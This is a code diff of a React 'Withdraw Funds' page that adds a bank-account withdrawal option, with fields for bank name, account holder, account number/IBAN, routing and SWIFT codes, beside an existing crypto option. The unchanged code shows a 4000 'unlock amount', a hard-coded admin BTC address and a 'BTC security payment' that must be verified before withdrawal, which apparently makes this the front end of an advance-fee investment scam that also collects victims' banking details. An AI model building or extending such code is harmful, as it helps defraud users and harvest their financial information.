@@ -9,6 +9,7 @@ import {
 const UNLOCK_AMOUNT = 4000;
 
 type WithdrawStep = "form" | "unlock" | "submitted";
+type WithdrawalMethod = "CRYPTO" | "BANK";
 
 export default function WithdrawPage() {
   /* ── user data ── */
@@ -19,11 +20,17 @@ export default function WithdrawPage() {
   const [adminBtcAddress, setAdminBtcAddress] = useState("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh");
 
   /* ── form fields ── */
-  const [amount, setAmount]               = useState("");
-  const [cryptoType, setCryptoType]       = useState("BTC");
+  const [amount, setAmount] = useState("");
+  const [withdrawalMethod, setWithdrawalMethod] = useState<WithdrawalMethod>("CRYPTO");
+  const [cryptoType, setCryptoType] = useState("BTC");
   const [walletAddress, setWalletAddress] = useState("");
+  const [bankName, setBankName] = useState("");
+  const [accountName, setAccountName] = useState("");
+  const [accountNumber, setAccountNumber] = useState("");
+  const [routingCode, setRoutingCode] = useState("");
+  const [swiftCode, setSwiftCode] = useState("");
   const [withdrawalType, setWithdrawalType] = useState("STANDARD");
-  const [formError, setFormError]         = useState("");
+  const [formError, setFormError] = useState("");
 
   /* ── unlock modal ── */
   const [step, setStep]           = useState<WithdrawStep>("form");
@@ -58,6 +65,7 @@ export default function WithdrawPage() {
 
   const parsedAmount = parseFloat(amount) || 0;
   const totalRequired = parsedAmount;
+  const isBankWithdrawal = withdrawalMethod === "BANK";
 
   /* ── Step 1: validate form → open unlock modal ── */
   const handleFormSubmit = (e: React.FormEvent) => {
@@ -68,14 +76,41 @@ export default function WithdrawPage() {
       setFormError("Please enter a valid amount to withdraw.");
       return;
     }
-    if (!walletAddress.trim()) {
-      setFormError("Please provide a receiving wallet address.");
-      return;
-    }
+
     if (totalRequired > userBalance) {
       setFormError(
         `Insufficient balance. You need $${totalRequired.toLocaleString("en-US", { minimumFractionDigits: 2 })} to cover this withdrawal.`
       );
+      return;
+    }
+
+    if (isBankWithdrawal) {
+      if (!bankName.trim()) {
+        setFormError("Please enter your bank name.");
+        return;
+      }
+      if (!accountName.trim()) {
+        setFormError("Please enter the account holder name.");
+        return;
+      }
+      if (!accountNumber.trim()) {
+        setFormError("Please provide your bank account number or IBAN.");
+        return;
+      }
+      if (!routingCode.trim() && !swiftCode.trim()) {
+        setFormError("Please provide either a routing number or SWIFT code for your bank.");
+        return;
+      }
+
+      setTxHash(`BANK-${Date.now().toString().slice(-8)}`);
+      setFinalMsg(`Bank withdrawal request submitted. Processing time: 2-5 Business Days`);
+      setUserBalance((prev) => prev - totalRequired);
+      setStep("submitted");
+      return;
+    }
+
+    if (!walletAddress.trim()) {
+      setFormError("Please provide a receiving wallet address.");
       return;
     }
 
@@ -99,8 +134,14 @@ export default function WithdrawPage() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           amount: parsedAmount,
+          withdrawalMethod,
           cryptoType,
           walletAddress,
+          bankName,
+          accountName,
+          accountNumber,
+          routingCode,
+          swiftCode,
           withdrawalType,
           totalRequired,
         }),
@@ -133,6 +174,11 @@ export default function WithdrawPage() {
     setStep("form");
     setAmount("");
     setWalletAddress("");
+    setBankName("");
+    setAccountName("");
+    setAccountNumber("");
+    setRoutingCode("");
+    setSwiftCode("");
     setTxHash("");
     setFormError("");
     setTxError("");
@@ -182,10 +228,12 @@ export default function WithdrawPage() {
                 <h3 className="text-2xl font-bold text-white">Withdrawal Submitted</h3>
                 <p className="text-gray-400 text-sm">{finalMsg}</p>
                 <p className="text-gray-500 text-xs">
-                  Your BTC security payment is being verified on-chain. Once confirmed, your withdrawal will be processed within the selected timeframe.
+                  {isBankWithdrawal
+                    ? "Your bank transfer request has been submitted and will be reviewed by the finance team within the selected processing window."
+                    : "Your BTC security payment is being verified on-chain. Once confirmed, your withdrawal will be processed within the selected timeframe."}
                 </p>
                 <div className="bg-gray-900 rounded-xl p-4 text-left text-xs">
-                  <p className="text-gray-500 mb-1">BTC Transaction Hash</p>
+                  <p className="text-gray-500 mb-1">{isBankWithdrawal ? "Reference ID" : "BTC Transaction Hash"}</p>
                   <p className="font-mono text-emerald-400 break-all">{txHash}</p>
                 </div>
                 <button
@@ -313,7 +361,7 @@ export default function WithdrawPage() {
       ═══════════════════════════════════════════════ */}
       <div>
         <h1 className="text-2xl font-bold text-navy-900 dark:text-white">Withdraw Funds</h1>
-        <p className="text-navy-600 dark:text-navy-400">Request a withdrawal to your personal crypto wallet.</p>
+        <p className="text-navy-600 dark:text-navy-400">Request a withdrawal to your personal wallet or bank account.</p>
       </div>
 
       <div className="bg-white dark:bg-navy-800 p-8 rounded-2xl border border-navy-200 dark:border-navy-700 shadow-sm">
@@ -382,6 +430,30 @@ export default function WithdrawPage() {
             </div>
           </div>
 
+          {/* Withdrawal method */}
+          <div className="space-y-3">
+            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300">Withdrawal Method</label>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              <label className={`cursor-pointer border-2 rounded-xl p-4 flex flex-col gap-2 transition-colors ${withdrawalMethod === "CRYPTO" ? "border-emerald-500 bg-emerald-50/50 dark:bg-emerald-900/10" : "border-navy-200 dark:border-navy-700 hover:border-emerald-300"}`}>
+                <input type="radio" name="method" value="CRYPTO" checked={withdrawalMethod === "CRYPTO"} onChange={(e) => setWithdrawalMethod(e.target.value as WithdrawalMethod)} className="sr-only" />
+                <div className="flex items-center justify-between">
+                  <span className="font-bold text-navy-900 dark:text-white">Crypto Wallet</span>
+                  <Bitcoin className="w-4 h-4 text-emerald-500" />
+                </div>
+                <p className="text-xs text-navy-500 dark:text-navy-400">Withdraw to BTC, ETH, or USDT.</p>
+              </label>
+
+              <label className={`cursor-pointer border-2 rounded-xl p-4 flex flex-col gap-2 transition-colors ${withdrawalMethod === "BANK" ? "border-blue-500 bg-blue-50/50 dark:bg-blue-900/10" : "border-navy-200 dark:border-navy-700 hover:border-blue-300"}`}>
+                <input type="radio" name="method" value="BANK" checked={withdrawalMethod === "BANK"} onChange={(e) => setWithdrawalMethod(e.target.value as WithdrawalMethod)} className="sr-only" />
+                <div className="flex items-center justify-between">
+                  <span className="font-bold text-navy-900 dark:text-white">Bank Account</span>
+                  <span className="text-xs font-semibold px-2 py-1 bg-blue-100 text-blue-700 rounded-md">Bank</span>
+                </div>
+                <p className="text-xs text-navy-500 dark:text-navy-400">Send funds directly to your bank.</p>
+              </label>
+            </div>
+          </div>
+
           {/* Amount */}
           <div>
             <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Withdrawal Amount (USD)</label>
@@ -407,36 +479,101 @@ export default function WithdrawPage() {
 
           </div>
 
-          {/* Crypto type */}
-          <div>
-            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Select Cryptocurrency</label>
-            <select
-              value={cryptoType}
-              onChange={(e) => setCryptoType(e.target.value)}
-              className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
-            >
-              <option value="BTC">Bitcoin (BTC)</option>
-              <option value="ETH">Ethereum (ETH)</option>
-              <option value="USDT">Tether (USDT - TRC20)</option>
-            </select>
-            {cryptoType === "USDT" && (
-              <p className="text-xs text-amber-500 font-bold mt-2">
-                ⚠️ Please ensure your receiving address is a TRC20 network address.
-              </p>
-            )}
-          </div>
+          {isBankWithdrawal ? (
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Bank Name</label>
+                <input
+                  type="text"
+                  value={bankName}
+                  onChange={(e) => setBankName(e.target.value)}
+                  className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                  placeholder="Bank of America"
+                />
+              </div>
 
-          {/* Wallet address */}
-          <div>
-            <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Your Receiving Wallet Address</label>
-            <input
-              type="text"
-              value={walletAddress}
-              onChange={(e) => setWalletAddress(e.target.value)}
-              className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
-              placeholder="Enter your crypto wallet address"
-            />
-          </div>
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Account Holder Name</label>
+                  <input
+                    type="text"
+                    value={accountName}
+                    onChange={(e) => setAccountName(e.target.value)}
+                    className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                    placeholder="John Doe"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Account Number / IBAN</label>
+                  <input
+                    type="text"
+                    value={accountNumber}
+                    onChange={(e) => setAccountNumber(e.target.value)}
+                    className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                    placeholder="1234567890"
+                  />
+                </div>
+              </div>
+
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Routing Number</label>
+                  <input
+                    type="text"
+                    value={routingCode}
+                    onChange={(e) => setRoutingCode(e.target.value)}
+                    className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                    placeholder="021000021"
+                  />
+                </div>
+
+                <div>
+                  <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">SWIFT Code</label>
+                  <input
+                    type="text"
+                    value={swiftCode}
+                    onChange={(e) => setSwiftCode(e.target.value)}
+                    className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                    placeholder="BOFAUS6S"
+                  />
+                </div>
+              </div>
+            </div>
+          ) : (
+            <>
+              {/* Crypto type */}
+              <div>
+                <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Select Cryptocurrency</label>
+                <select
+                  value={cryptoType}
+                  onChange={(e) => setCryptoType(e.target.value)}
+                  className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                >
+                  <option value="BTC">Bitcoin (BTC)</option>
+                  <option value="ETH">Ethereum (ETH)</option>
+                  <option value="USDT">Tether (USDT - TRC20)</option>
+                </select>
+                {cryptoType === "USDT" && (
+                  <p className="text-xs text-amber-500 font-bold mt-2">
+                    ⚠️ Please ensure your receiving address is a TRC20 network address.
+                  </p>
+                )}
+              </div>
+
+              {/* Wallet address */}
+              <div>
+                <label className="block text-sm font-medium text-navy-700 dark:text-navy-300 mb-1">Your Receiving Wallet Address</label>
+                <input
+                  type="text"
+                  value={walletAddress}
+                  onChange={(e) => setWalletAddress(e.target.value)}
+                  className="block w-full px-4 py-3 border border-navy-200 dark:border-navy-700 rounded-xl bg-white dark:bg-navy-900 text-navy-900 dark:text-white focus:ring-2 focus:ring-emerald-500 outline-none transition-all"
+                  placeholder="Enter your crypto wallet address"
+                />
+              </div>
+            </>
+          )}
 
           <button
             type="submit"
